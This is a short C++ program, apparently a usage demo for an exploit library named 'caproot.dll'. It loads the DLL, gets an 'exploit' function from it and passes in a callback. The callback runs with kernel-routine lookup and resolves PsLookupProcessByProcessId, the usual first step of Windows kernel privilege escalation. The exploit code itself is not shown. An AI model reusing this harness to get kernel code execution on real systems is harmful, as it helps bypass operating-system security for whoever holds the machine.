// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <cstdio>
#include <functional>

#pragma comment(lib, "ntdll.lib") // to get RtlInitUnicodeString

using func_MmGetSystemRoutineAddressFunc = PVOID(NTAPI*)(PUNICODE_STRING);
using func_root_func = std::function<VOID(func_MmGetSystemRoutineAddressFunc)>;
using func_exploit = bool(NTAPI*)(func_root_func);
using func_caproot_initialize = func_exploit(NTAPI*)();
using func_caproot_uninitialize = bool(NTAPI*)();

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) { return TRUE; }

void* PsLookupProcessByProcessId = 0;

VOID NTAPI root_func(func_MmGetSystemRoutineAddressFunc MmGetSystemRoutineAddress) {
    UNICODE_STRING str_PsLookupProcessByProcessIdStr;
    RtlInitUnicodeString(&str_PsLookupProcessByProcessIdStr, L"PsLookupProcessByProcessId");
    PsLookupProcessByProcessId = MmGetSystemRoutineAddress(&str_PsLookupProcessByProcessIdStr);
}

int main() {
    auto caproot = LoadLibraryW(L"caproot.dll");
    if (!caproot) {
        printf("[-] caproot load failed\n");
        return 1;
    }

    auto caproot_init = (func_caproot_initialize)GetProcAddress(caproot, "initialize");
    auto caproot_uninit = (func_caproot_uninitialize)GetProcAddress(caproot, "uninitialize");
    if (!caproot_init || !caproot_uninit) {
        printf("[-] caproot get proc failed\n");
        return 1;
    }

    auto exploit = caproot_init();
    if (!exploit) {
        printf("[-] caproot init failed\n");
        return 1;
    }

    if (!exploit(root_func)) {
        printf("[-] run exploit failed\n");
        return 1;
    }
    printf("[*] result: %p\n", PsLookupProcessByProcessId);

    if (!caproot_uninit()) {
        printf("[-] caproot uninit failed\n");
        return 1;
    }

    return 0;
}
